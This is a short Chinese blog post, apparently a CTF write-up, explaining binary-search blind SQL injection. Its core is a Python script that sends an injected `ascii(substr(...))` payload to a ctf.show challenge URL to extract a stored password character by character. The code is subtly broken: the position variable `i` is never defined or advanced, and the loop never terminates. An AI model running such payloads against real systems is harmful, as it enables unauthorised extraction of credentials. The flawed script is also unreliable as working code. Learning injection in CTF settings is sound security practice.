---
title: "SQL 盲注二分法"
date: 2022-07-28T20:00:43+08:00
draft: false
tags: ['sqli','python']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

之前一直都是整个过一遍字典... 二分法没怎么研究

二分法有一个使用条件, 就是需要查找的内容必须有序 (即按照从小到大或从大到小的顺序排序)

这里借 ASCII 码实现二分法盲注

<!--more-->

二分法 时间复杂度为 `O(log2n)`, 二分法查找比遍历字典查找效率高得多

```
import requests

url = 'http://a2a7e64c-6f02-4059-84fc-3cdda760b232.challenge.ctf.show/api/index.php?id=1'

flag = ''

while True:

    min = 32
    max = 127

    while min < max:
        mid = (min + max) // 2
        payload = '\' and if(ascii(substr((select password from ctfshow_user where username=\'flag\'),{},1))>{},1,0) %23'.format(i,mid)
        res = requests.get(url + payload)
        if 'admin' in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    print(flag)

```

这里主要说一下为什么是 `min = mid +1` 和 `max = mid`

当判断 mid 大于某个值的结果为 true 时, 这个所求值肯定是比 mid 要大的 (大于), 所以是 `mid + 1`

当结果为 false 时, 所求值应该是不超过 mid (小于等于), 所以是 `max = mid`